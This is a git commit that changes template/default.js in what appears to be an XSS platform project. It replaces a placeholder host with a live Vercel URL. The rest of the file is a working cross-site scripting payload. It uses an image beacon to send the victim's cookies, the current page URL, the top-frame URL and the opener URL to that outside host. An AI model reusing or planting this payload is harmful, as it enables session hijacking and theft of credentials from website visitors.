ff4395b666a14fdb941cd69aa5ff1045fb038df6
BigMonster1 <43925265+BigMonster1@users.noreply.github.com>
2024-05-24 16:43:06 +0800

    Update default.js

--- template/default.js
+++ template/default.js
@@ -1,2 +1,2 @@
-var website="http://网站地址";
+var website="https://vercel-xss-platform-felf-puhl3hvtd-superbigs-projects.vercel.app/";
 (function(){(new Image()).src=website+'/?keepsession=1&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();
